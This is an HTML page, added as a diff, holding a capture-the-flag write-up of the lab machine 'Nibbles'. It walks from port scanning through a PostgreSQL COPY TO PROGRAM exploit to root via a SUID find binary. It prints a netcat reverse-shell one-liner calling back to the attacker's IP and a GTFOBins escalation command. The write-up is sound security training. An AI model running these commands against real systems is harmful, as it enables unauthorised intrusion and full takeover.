@@ -1,0 +1,95 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+<meta charset="UTF-8"><meta name="viewport" content="width=device-width, initial-scale=1.0">
+<title>Nibbles &middot; Writeups</title>
+<link rel="stylesheet" href="style.css">
+<link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/highlight.js/11.9.0/styles/atom-one-dark.min.css">
+</head>
+<body>
+<header class="topbar">
+  <a class="home" href="./index.html">&larr; all writeups</a>
+  <span class="brand">SAMSON &middot; CTF</span>
+</header>
+<main class="article">
+  <div class="boxhead">
+    <div class="bh-left">
+      <span class="badge pg">PG</span>
+      <span class="badge os">Linux</span>
+      <span class="badge deep">in-depth</span>
+    </div>
+    <h1>Nibbles</h1>
+    <div class="meta">Target: <code>192.168.206.47</code></div>
+    <div class="tags"><span class="tag">Linux</span><span class="tag">PostgreSQL</span><span class="tag">RCE</span><span class="tag">CVE</span><span class="tag">SUID</span><span class="tag">find</span><span class="tag">GTFOBins</span><span class="tag">CredentialReuse</span></div>
+  </div>
+  <div class="layout">
+    <nav class="toc"><a class="lvl2" href="#overview">Overview</a><a class="lvl2" href="#recon">Recon</a><a class="lvl3" href="#port-scan">Port Scan</a><a class="lvl3" href="#web-enumeration">Web Enumeration</a><a class="lvl2" href="#foothold">Foothold</a><a class="lvl3" href="#postgresql-rce-cve-9-3-11-7">PostgreSQL RCE, CVE (9.3-11.7)</a><a class="lvl2" href="#privilege-escalation">Privilege Escalation</a><a class="lvl3" href="#suid-find">SUID find</a><a class="lvl2" href="#root">Root</a><a class="lvl2" href="#takeaways">Takeaways</a></nav>
+    <article class="body"><h2 id="overview">Overview</h2>
+<p>Nibbles exposes a PostgreSQL database on a non-standard port with no authentication required. An authenticated RCE exploit targeting PostgreSQL 11.3-11.9 delivers a shell as the <code>postgres</code> service user. A SUID bit on <code>/usr/bin/find</code> then closes the box in one command via GTFOBins.</p>
+<h2 id="recon">Recon</h2>
+<h3 id="port-scan">Port Scan</h3>
+<pre><code class="language-sh">PORT     STATE SERVICE    VERSION
+21/tcp   open  ftp        vsftpd 3.0.3
+22/tcp   open  ssh        OpenSSH 7.9p1 Debian 10+deb10u2 (protocol 2.0)
+80/tcp   open  http       Apache httpd 2.4.38 ((Debian))
+5437/tcp open  postgresql PostgreSQL DB 11.3 - 11.9
+</code></pre>
+<p>Port 80 had no interesting content (gobuster returned only 403s across the full wordlist). Port 5437 running PostgreSQL publicly is the primary finding, databases should not be internet-accessible.</p>
+<h3 id="web-enumeration">Web Enumeration</h3>
+<pre><code class="language-sh">gobuster dir -u http://192.168.206.47/ -w /home/kali/Tools/SecLists/Discovery/Web-Content/big.txt -x php
+# No findings beyond 403 errors
+</code></pre>
+<p>The HTTP service offered nothing. The PostgreSQL instance on 5437 was the attack path.</p>
+<h2 id="foothold">Foothold</h2>
+<h3 id="postgresql-rce-cve-9-3-11-7">PostgreSQL RCE, CVE (9.3-11.7)</h3>
+<p>PostgreSQL 11.3-11.9 has a known authenticated RCE vulnerability (Exploit-DB 50847) that abuses the <code>COPY TO/FROM PROGRAM</code> feature to run arbitrary OS commands as the database user. The target was running PostgreSQL 11.7, confirmed in-range:</p>
+<pre><code class="language-sh">python3 psql.py -i 192.168.206.47 -p 5437 -c id
+[+] Connection to Database established
+[+] PostgreSQL 11.7 is likely vulnerable
+[+] Command executed
+uid=106(postgres) gid=113(postgres) groups=113(postgres),112(ssl-cert)
+</code></pre>
+<blockquote>
+<p><strong>Why <code>COPY TO PROGRAM</code> is RCE:</strong> PostgreSQL's <code>COPY</code> command can pipe data to or from a shell command. A user with the right privileges (the default <code>postgres</code> superuser role) can run <code>COPY (SELECT '') TO PROGRAM 'cmd'</code>, and the database server executes <code>cmd</code> as the OS user running the PostgreSQL process. On this target, the database was listening publicly and accepted connections without a password, so no brute-forcing was needed.</p>
+</blockquote>
+<p>Upgraded to a full reverse shell using mkfifo:</p>
+<pre><code class="language-sh">python3 psql.py -i 192.168.206.47 -p 5437 -c 'rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|sh -i 2&gt;&amp;1|nc 192.168.45.167 80 &gt;/tmp/f'
+</code></pre>
+<pre><code class="language-sh">rlwrap nc -lvnp 80
+connect to [192.168.45.167] from (UNKNOWN) [192.168.206.47] 47492
+$ whoami
+postgres
+</code></pre>
+<p>TTY upgrade:</p>
+<pre><code class="language-sh">python -c 'import pty; pty.spawn(&quot;/bin/bash&quot;)'
+</code></pre>
+<h2 id="privilege-escalation">Privilege Escalation</h2>
+<h3 id="suid-find">SUID find</h3>
+<p>LinPEAS found a SUID bit on the system <code>find</code> binary:</p>
+<pre><code class="language-sh">-rwsr-xr-x 1 root root 309K Feb 16  2019 /usr/bin/find
+</code></pre>
+<p>GTFOBins SUID method for <code>find</code>:</p>
+<pre><code class="language-sh">postgres@nibbles:/tmp$ find . -exec /bin/sh -p \; -quit
+# whoami
+root
+</code></pre>
+<blockquote>
+<p><strong>Why SUID <code>find</code> escalates privileges:</strong> <code>find</code> with the SUID bit runs as its owner (root) regardless of who invokes it. The <code>-exec</code> flag runs an arbitrary command in a child process that inherits the effective UID of <code>find</code>. Passing <code>/bin/sh -p</code> (preserve effective UID) spawns a shell running as root. The <code>-quit</code> stops <code>find</code> after the first execution so it doesn't loop through every file in the current directory.</p>
+</blockquote>
+<h2 id="root">Root</h2>
+<pre><code class="language-sh"># cat proof.txt
+‹redacted›
+</code></pre>
+<h2 id="takeaways">Takeaways</h2>
+<ul>
+<li><strong>Databases on non-standard ports with no authentication are direct footholds.</strong> Port 5437 with no credentials meant the <code>COPY TO PROGRAM</code> exploit ran without any authentication phase.</li>
+<li><strong><code>COPY TO PROGRAM</code> turns database access into OS code execution.</strong> Any PostgreSQL superuser can use this; it's not a bug but an intentional feature that becomes a vulnerability when the database is externally accessible.</li>
+<li><strong>SUID on standard system binaries like <code>find</code> is an immediate privilege escalation.</strong> Check <code>find / -perm -u=s 2&gt;/dev/null</code> early in post-exploitation.</li>
+</ul></article>
+  </div>
+</main>
+<footer class="foot">Samson Laird &middot; retired-machine writeups &middot; secrets redacted</footer>
+<script src="https://cdnjs.cloudflare.com/ajax/libs/highlight.js/11.9.0/highlight.min.js"></script>
+<script>hljs.highlightAll();</script>
+</body>
+</html>
